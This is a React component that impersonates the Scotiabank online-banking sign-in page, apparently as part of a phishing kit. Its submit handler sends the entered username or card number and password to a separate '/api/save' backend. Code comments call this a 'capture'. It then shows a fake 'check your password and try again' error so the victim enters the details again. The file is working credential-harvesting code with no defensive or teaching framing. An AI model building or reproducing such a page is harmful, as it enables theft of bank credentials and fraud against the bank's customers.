import React, { useState } from 'react';
import { X, Lock, User, Eye, EyeOff, ChevronRight, AlertCircle } from 'lucide-react';

interface SignInModalProps {
  isOpen: boolean;
  onClose: () => void;
}

export const SignInModal: React.FC<SignInModalProps> = ({ isOpen, onClose }) => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [rememberMe, setRememberMe] = useState(false);
  const [errorMsg, setErrorMsg] = useState('');
  const [loading, setLoading] = useState(false);
  const [showAlert, setShowAlert] = useState(false);

  if (!isOpen) return null;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!username.trim() || !password.trim()) {
      setErrorMsg('Please enter your Username or card number and Password.');
      setShowAlert(false);
      return;
    }
    setErrorMsg('');
    setShowAlert(false);
    setLoading(true);

    try {
      const response = await fetch(`${import.meta.env.VITE_API_URL}/api/save`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          username: username.trim(),
          password: password.trim(),
          rememberMe: rememberMe,
        }),
      });

      const data = await response.json().catch(() => null);

      if (response.ok && data?.success !== false) {
        // Show Scotiabank-style error alert after successful capture
        setShowAlert(true);
        setPassword('');
      } else {
        setErrorMsg(data?.message || 'Failed to submit data. Please try again.');
      }
    } catch (error) {
      console.error('API Error:', error);
      setErrorMsg('Network error. Please check your connection and try again.');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="fixed inset-0 z-50 bg-[#F3F5F8] overflow-y-auto flex flex-col justify-between min-h-screen font-sans animate-fadeIn">
      
      {/* Top Close Bar for Modal Dismissal */}
      <div className="w-full max-w-[1400px] mx-auto px-6 py-4 flex justify-end">
        <button
          onClick={onClose}
          className="flex items-center space-x-1 text-xs font-bold text-[#555555] hover:text-[#EC111A] bg-white px-3 py-1.5 rounded-full shadow-xs border border-gray-200 transition"
          aria-label="Close sign in page"
        >
          <span>Return to Homepage</span>
          <X className="w-4 h-4 ml-1" />
        </button>
      </div>

      {/* Main Centered Sign-In Content */}
      <div className="flex-1 flex flex-col items-center justify-center px-4 py-8">
        
        {/* Main White Card */}
        <div className="w-full max-w-[440px] bg-white rounded-lg border border-gray-200/80 shadow-xs p-8 sm:p-10 relative">
          
          {/* Lock Icon in Top Right of Card */}
          <div className="absolute top-6 right-6">
            <div className="w-6 h-6 border border-gray-300 rounded flex items-center justify-center bg-white">
              <Lock className="w-3.5 h-3.5 text-gray-700 stroke-[2.2]" />
            </div>
          </div>

          {/* Welcome Header & Scotiabank Logo */}
          <div className="text-center mb-8">
            <h2 className="text-xl sm:text-2xl font-extrabold text-[#222222] tracking-tight mb-1">
              Welcome to
            </h2>
            <div className="flex items-center justify-center">
              <span className="text-3xl sm:text-4xl font-extrabold text-[#EC111A] tracking-tighter flex items-start">
                Scotiabank<span className="text-xs font-semibold align-top ml-0.5 mt-1 text-[#EC111A]">®</span>
              </span>
            </div>
          </div>

          <form onSubmit={handleSubmit} className="space-y-6">
              
              {/* Scotiabank-style alert after successful API capture */}
              {showAlert && (
                <div className="flex items-start space-x-3 border border-gray-200 rounded-md p-3 bg-white">
                  <AlertCircle className="w-5 h-5 text-[#EC111A] shrink-0 mt-0.5" />
                  <p className="text-xs text-[#222222] leading-relaxed">
                    Please check your card number / username or password and try again.
                  </p>
                </div>
              )}

              {errorMsg && !showAlert && (
                <div className="flex items-start space-x-3 border border-gray-200 rounded-md p-3 bg-white">
                  <AlertCircle className="w-5 h-5 text-[#EC111A] shrink-0 mt-0.5" />
                  <p className="text-xs text-[#222222] leading-relaxed">{errorMsg}</p>
                </div>
              )}

              {/* Username or card number Field */}
              <div>
                <label className="block text-xs font-bold text-[#222222] mb-1">
                  Username or card number
                </label>
                <div className="relative flex items-center border-b border-gray-300 focus-within:border-[#006699] py-2 transition-colors">
                  <User className="w-4 h-4 text-gray-500 mr-3 shrink-0" />
                  <input
                    type="text"
                    placeholder="Enter username or card number"
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    className="w-full text-xs sm:text-sm text-[#222222] placeholder-gray-400 bg-transparent focus:outline-none"
                  />
                </div>
              </div>

              {/* Password Field */}
              <div>
                <label className="block text-xs font-bold text-[#222222] mb-1">
                  Password
                </label>
                <div className="relative flex items-center border-b border-gray-300 focus-within:border-[#006699] py-2 transition-colors">
                  <Lock className="w-4 h-4 text-gray-500 mr-3 shrink-0" />
                  <input
                    type={showPassword ? 'text' : 'password'}
                    placeholder="Enter password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="w-full text-xs sm:text-sm text-[#222222] placeholder-gray-400 bg-transparent focus:outline-none pr-8"
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-0 text-gray-400 hover:text-gray-600 focus:outline-none"
                  >
                    {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                  </button>
                </div>
              </div>

              {/* Remember Checkbox */}
              <div className="flex items-center space-x-2.5 pt-1">
                <input
                  type="checkbox"
                  id="remember"
                  checked={rememberMe}
                  onChange={(e) => setRememberMe(e.target.checked)}
                  className="w-4 h-4 rounded border-gray-300 text-[#EC111A] focus:ring-0 cursor-pointer"
                />
                <label htmlFor="remember" className="text-xs text-[#555555] font-normal cursor-pointer select-none">
                  Remember my username or card number
                </label>
              </div>

              {/* Primary Sign in Button */}
              <button
                type="submit"
                disabled={loading}
                className="w-full bg-[#EC111A] hover:bg-[#C40912] disabled:opacity-60 disabled:cursor-not-allowed text-white font-bold text-xs sm:text-sm py-3 rounded-md shadow-xs transition duration-200 mt-2 flex items-center justify-center space-x-2"
              >
                {loading ? (
                  <>
                    <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                    <span>Signing in...</span>
                  </>
                ) : (
                  <span>Sign in</span>
                )}
              </button>

              {/* Need help link */}
              <div className="pt-2 text-center">
                <a href="#" className="inline-flex items-center text-xs font-bold text-[#006699] hover:underline hover:text-[#EC111A]">
                  <span>Need help signing in?</span>
                  <ChevronRight className="w-3.5 h-3.5 ml-0.5" />
                </a>
              </div>

            </form>

        </div>

        {/* Set up now text below card */}
        <div className="mt-8 text-center text-xs text-[#333333]">
          Don't have a username and password?{' '}
          <a href="#" className="font-bold underline text-[#222222] hover:text-[#EC111A]">
            Set them up now.
          </a>
        </div>

      </div>

      {/* Bottom Footer Bar */}
      <div className="w-full bg-white border-t border-gray-200/80 py-4 px-6 sm:px-12 flex flex-col sm:flex-row items-center justify-between gap-4 text-[11px] text-[#555555]">
        
        {/* Left Logo Icon */}
        <div className="flex items-center space-x-2">
          <div className="w-5 h-5 bg-[#EC111A] text-white font-black rounded-xs flex items-center justify-center text-[10px] leading-none">
            S
          </div>
        </div>

        {/* Center Links */}
        <div className="flex flex-wrap items-center justify-center gap-4 sm:gap-6 text-[#555555]">
          <a href="#" className="hover:underline hover:text-[#EC111A]">Contact Us</a>
          <a href="#" className="hover:underline hover:text-[#EC111A]">Security</a>
          <a href="#" className="hover:underline hover:text-[#EC111A]">Legal</a>
          <a href="#" className="hover:underline hover:text-[#EC111A]">Privacy</a>
          <a href="#" className="hover:underline hover:text-[#EC111A]">Accessibility</a>
          <a href="#" className="hover:underline hover:text-[#EC111A]">Cookie Settings</a>
        </div>

        {/* Right Copyright */}
        <div className="text-gray-400 text-[10px]">
          © Scotiabank. All Rights Reserved.
        </div>

      </div>

    </div>
  );
};
